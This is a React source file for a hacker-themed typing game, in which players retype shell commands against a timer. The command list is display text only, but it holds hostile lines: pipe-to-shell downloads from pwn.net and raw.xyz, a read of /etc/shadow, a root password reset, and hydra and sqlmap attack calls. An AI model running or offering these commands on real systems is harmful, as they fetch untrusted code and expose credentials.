"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Command, Terminal as TermIcon, ShieldAlert, Cpu, AlertTriangle, ScanLine, XCircle, Power } from 'lucide-react';
import { useMechanicalSound } from '@/hooks/useMechanicalSound';

const BASH_COMMANDS = [
  "sudo systemctl restart nginx",
  "tail -f /var/log/syslog | grep error",
  "ssh -p 2222 admin@10.0.0.5",
  "chmod 755 ./execute_payload.sh",
  "tar -czvf backup.tar.gz /etc",
  "find . -name '*.pyc' -delete",
  "nmap -A -T4 192.168.1.0/24",
  "grep -rnw '/var/www/' -e 'password'",
  "iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
  "chown -R www-data:www-data /var/www/html",
  "echo 'root:admin123' | chpasswd",
  "curl -sL https://pwn.net/script.sh | bash",
  "ps aux | grep root | awk '{print $2}'",
  "netstat -ano | findstr :8080",
  "docker-compose -f prod.yml up -d",
  "rm -rf /tmp/cache_dumps/*",
  "cat /etc/shadow > /tmp/out.txt",
  "wget -O- https://raw.xyz | sh",
  "hydra -l root -P pass.txt ssh://10.10.10.1",
  "sqlmap -u 'http://site.com/?id=1' --dbs"
];

const BOOT_SEQUENCE = [
  "BIOS Date 04/16/26 14:22:11 Ver 08.00.15",
  "CPU: Intel(R) Core(TM) i9-14900KS CPU @ 6.20GHz",
  "Speed: 6.20 GHz Count: 24",
  "Memory Test: 134217728K OK",
  "Detecting IDE drives ...",
  "[    0.000000] Linux version 6.8.0-kali (gcc (Debian 13.2.0-2) 13.2.0)",
  "[    0.041029] kernel routing table initialized",
  "[    0.852312] systemd[1]: Inserted module 'autofs4'",
  "[    1.002938] eth0: link up, 10000Mbps, full-duplex, lpa 0x3800",
  "[    1.250119] EXT4-fs (sda1): mounted filesystem with ordered data mode",
  "Starting Cryptography Interface...",
  "Loading Core Modules... [OK]",
  "Establishing Secure Shell Uplink... [OK]",
  "WARNING: UNAUTHORIZED ACCESS DETECTED",
  "INITIATING OVERRIDE PROTOCOL..."
];

const CMD_OUTPUTS = [
  "Executing... [SUCCESS]",
  "Bytes transferred: 4096",
  "Connection established on port 443",
  "Process bypassed successfully.",
  "Payload injected at 0x000F43A.",
  "Access privileges escalated to ROOT.",
  "Warning: IDS tracing identified.",
  "Data packet decrypted securely.",
  "Firewall rules updated."
];

// Helper to grab random items safely
const getRandomItem = (arr: any[]) => arr[Math.floor(Math.random() * arr.length)];
const generateRandomIP = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 255)}`;

export default function TerminalHackerGame() {
  const [gameState, setGameState] = useState<'booting' | 'playing' | 'gameover'>('booting');
  const [bootLogs, setBootLogs] = useState<string[]>([]);
  
  const [level, setLevel] = useState(1);
  const [score, setScore] = useState(0);
  const [combo, setCombo] = useState(0);
  
  const [terminalHistory, setTerminalHistory] = useState<{ type: 'input' | 'output', text: string }[]>([]);
  
  const [targetCmd, setTargetCmd] = useState("");
  const [typedChars, setTypedChars] = useState<string[]>([]);
  
  // Timer system (initial time adjusted to be more forgiving)
  const [timeLeft, setTimeLeft] = useState(45.0); 
  
  const playKeystroke = useMechanicalSound(true);
  const scrollRef = useRef<HTMLDivElement>(null);
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  // Auto-scroll Down
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [terminalHistory, typedChars, bootLogs]);

  // Boot sequence effect
  useEffect(() => {
    if (gameState === 'booting') {
      let step = 0;
      const t = setInterval(() => {
        if (step < BOOT_SEQUENCE.length) {
          setBootLogs(prev => [...prev, BOOT_SEQUENCE[step]]);
          playKeystroke('normal');
          step++;
        } else {
          clearInterval(t);
          setTimeout(() => {
            startGame();
          }, 1000);
        }
      }, 150); // fast boot
      return () => clearInterval(t);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [gameState]);

  const initCommand = useCallback(() => {
    setTargetCmd(prev => {
      let cmd = prev;
      while (cmd === prev) { cmd = getRandomItem(BASH_COMMANDS); }
      return cmd;
    });
    setTypedChars([]);
  }, []);

  const startGame = () => {
    setGameState('playing');
    setLevel(1);
    setScore(0);
    setCombo(0);
    setTerminalHistory([{ type: 'output', text: `Session initialized via uplink to ${generateRandomIP()}` }]);
    setTimeLeft(45.0);
    initCommand();
  };

  // Timer Countdown Logic
  useEffect(() => {
    if (gameState === 'playing') {
      timerRef.current = setInterval(() => {
        setTimeLeft(prev => {
          if (prev <= 0.1) {
            setGameState('gameover');
            return 0;
          }
          return prev - 0.1;
        });
      }, 100);
    }
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [gameState]);

  // Keydown Logic for Typing
  useEffect(() => {
    if (gameState !== 'playing') return;

    const handleKeyDown = (e: KeyboardEvent) => {
      // Ignore special keys
      if (e.key.length > 1 || e.ctrlKey || e.metaKey || e.altKey) return;

      const currentTargetChar = targetCmd[typedChars.length];
      
      if (e.key === currentTargetChar) {
        // Correct char
        const newTyped = [...typedChars, e.key];
        setTypedChars(newTyped);
        playKeystroke('normal');
        
        // Command completed?
        if (newTyped.length === targetCmd.length) {
          playKeystroke('space'); // Deeper sound for enter/submit
          
          setTerminalHistory(prev => [
            ...prev,
            { type: 'input', text: targetCmd },
            { type: 'output', text: `${getRandomItem(CMD_OUTPUTS)}` }
          ]);
          
          setScore(prev => prev + (50 * (1 + Math.floor(combo / 5))));
          setCombo(prev => prev + 1);
          setLevel(prev => prev + 1);
          
          // Add time back based on level, but cap it so it gets harder
          setTimeLeft(prev => {
            const addedTime = Math.max(5, 15 - (level * 0.5));
            return Math.min(45, prev + addedTime);
          });
          
          initCommand();
        }
      } else {
        // Error char
        playKeystroke('error');
        setCombo(0);
        // Penalty: lose 0.5 seconds
        setTimeLeft(prev => Math.max(0, prev - 0.5));
        
        // Terminal flashes red briefly via DOM API for performance
        const editor = document.getElementById('crt-terminal');
        if (editor) {
          editor.classList.add('bg-red-900/40');
          setTimeout(() => editor.classList.remove('bg-red-900/40'), 100);
        }
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [gameState, targetCmd, typedChars, level, combo, initCommand, playKeystroke]);


  // Timer Formatting
  const formatTime = (time: number) => {
    return time.toFixed(1);
  };

  return (
    <div className="relative w-full h-full bg-black overflow-hidden font-mono select-none" id="crt-terminal">
      
      {/* CRT Display Overlays */}
      <div className="absolute inset-0 pointer-events-none z-50 mix-blend-overlay opacity-30 shadow-[inset_0_0_100px_rgba(0,0,0,0.9)]" 
           style={{ background: 'radial-gradient(circle, transparent 50%, rgba(0,0,0,0.8) 120%)' }} />
      <div className="absolute inset-0 pointer-events-none z-50 opacity-10 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_4px,3px_100%]" />
      
      {/* Scanline Animation */}
      <motion.div 
        className="absolute top-0 left-0 right-0 h-4 bg-teal-400/10 pointer-events-none z-50 blur-[2px]"
        animate={{ y: ['-10vh', '110vh'] }}
        transition={{ repeat: Infinity, duration: 4, ease: "linear" }}
      />
      
      <AnimatePresence mode="wait">
        
        {/* BOOT PHASE */}
        {gameState === 'booting' && (
          <motion.div 
            key="booting"
            exit={{ opacity: 0, filter: 'blur(5px)' }}
            className="w-full h-full p-8 text-teal-400/80 font-bold text-sm leading-relaxed"
          >
            {bootLogs.map((log, idx) => (
              <div key={idx} className="mb-1">{log}</div>
            ))}
            <motion.div 
              animate={{ opacity: [1, 0] }}
              transition={{ repeat: Infinity, duration: 0.8 }}
              className="inline-block w-3 h-5 bg-teal-400 mt-2"
            />
          </motion.div>
        )}

        {/* PLAYING PHASE */}
        {gameState === 'playing' && (
          <motion.div 
            key="playing"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="w-full h-full flex flex-col p-6 text-teal-400 z-10 relative"
          >
            {/* Top HUD */}
            <div className="flex justify-between items-center mb-4 border-b border-teal-500/30 pb-4">
              <div className="flex items-center gap-4">
                <Command className="w-6 h-6 text-teal-300" />
                <div>
                  <div className="text-xs uppercase tracking-widest text-teal-600">Current Node</div>
                  <div className="font-bold">SYSTEM_{level}</div>
                </div>
              </div>
              
              <div className="flex flex-col items-center">
                <div className="text-xs uppercase tracking-widest text-teal-600">Connection Integrity</div>
                <div className={`text-4xl font-black tabular-nums transition-colors ${timeLeft <= 3 ? 'text-red-500 animate-pulse' : 'text-teal-300'}`}>
                  {formatTime(timeLeft)}s
                </div>
              </div>
              
              <div className="flex items-center gap-6 text-right">
                <div>
                  <div className="text-xs uppercase tracking-widest text-teal-600">Score</div>
                  <div className="font-bold text-xl">{score}</div>
                </div>
                <div>
                  <div className="text-xs uppercase tracking-widest text-teal-600">Combo</div>
                  <div className="font-bold text-xl text-teal-200">{combo}x</div>
                </div>
              </div>
            </div>

            {/* Terminal Window */}
            <div 
              ref={scrollRef}
              className="flex-1 overflow-y-auto mb-4 custom-scrollbar text-lg tracking-wide leading-loose"
            >
              {/* History */}
              {terminalHistory.map((item, idx) => (
                <div key={idx} className="mb-2">
                  {item.type === 'input' ? (
                    <div className="text-teal-200">
                      <span className="text-teal-600 mr-2">root@mainframe:~#</span>
                      {item.text}
                    </div>
                  ) : (
                    <div className="text-teal-500 font-medium pl-4 border-l-2 border-teal-500/20">
                      {item.text}
                    </div>
                  )}
                </div>
              ))}
              
              {/* Active Prompt */}
              <div className="mt-4 break-words">
                <span className="text-teal-600 mr-2 font-bold animate-pulse">root@mainframe:~#</span>
                
                {/* Typed part */}
                <span className="text-teal-100 font-bold">
                  {targetCmd.slice(0, typedChars.length)}
                </span>
                
                {/* Active Cursor / Target Char */}
                <span className="relative">
                  <span className="opacity-0">{targetCmd[typedChars.length] || ' '}</span>
                  <motion.span 
                    className="absolute left-0 top-0 w-[12px] h-full bg-teal-400 text-black flex items-center justify-center font-bold pb-1"
                  >
                    {targetCmd[typedChars.length] === ' ' ? '\u00A0' : targetCmd[typedChars.length]}
                  </motion.span>
                </span>
                
                {/* Remaining un-typed part */}
                <span className="text-teal-700/60 font-medium">
                  {targetCmd.slice(typedChars.length + 1)}
                </span>
              </div>
            </div>
          </motion.div>
        )}

        {/* GAMEOVER PHASE */}
        {gameState === 'gameover' && (
          <motion.div 
            key="gameover"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="absolute inset-0 z-50 flex flex-col items-center justify-center bg-black backdrop-blur-md text-red-500"
          >
            <ShieldAlert className="w-32 h-32 mb-8 drop-shadow-[0_0_30px_rgba(220,38,38,0.6)]" />
            <h2 className="text-6xl font-black uppercase tracking-widest mb-2 text-transparent bg-clip-text bg-gradient-to-b from-red-400 to-red-800">
              Connection Severed
            </h2>
            <div className="text-xl mb-12 text-red-400/80 uppercase tracking-[0.3em]">
              IDS Trace Successful
            </div>
            
            <div className="flex gap-8 mb-12">
              <div className="flex flex-col items-center p-6 border border-red-900/50 bg-red-950/20 w-40">
                <div className="text-xs uppercase text-red-500/60 tracking-widest mb-2">Final Score</div>
                <div className="text-3xl font-bold text-red-200">{score}</div>
              </div>
              <div className="flex flex-col items-center p-6 border border-red-900/50 bg-red-950/20 w-40">
                <div className="text-xs uppercase text-red-500/60 tracking-widest mb-2">Nodes Breached</div>
                <div className="text-3xl font-bold text-red-200">{level - 1}</div>
              </div>
            </div>
            
            <button 
              onClick={() => {
                setBootLogs([]);
                setGameState('booting');
              }}
              className="px-8 py-4 bg-red-900/20 border border-red-500/50 text-red-400 font-bold tracking-[0.2em] uppercase hover:bg-red-500 hover:text-black hover:shadow-[0_0_30px_rgba(220,38,38,0.8)] transition-all flex items-center gap-3"
            >
              <Power className="w-5 h-5" />
              Reconnect
            </button>
          </motion.div>
        )}
        
      </AnimatePresence>
    </div>
  );
}
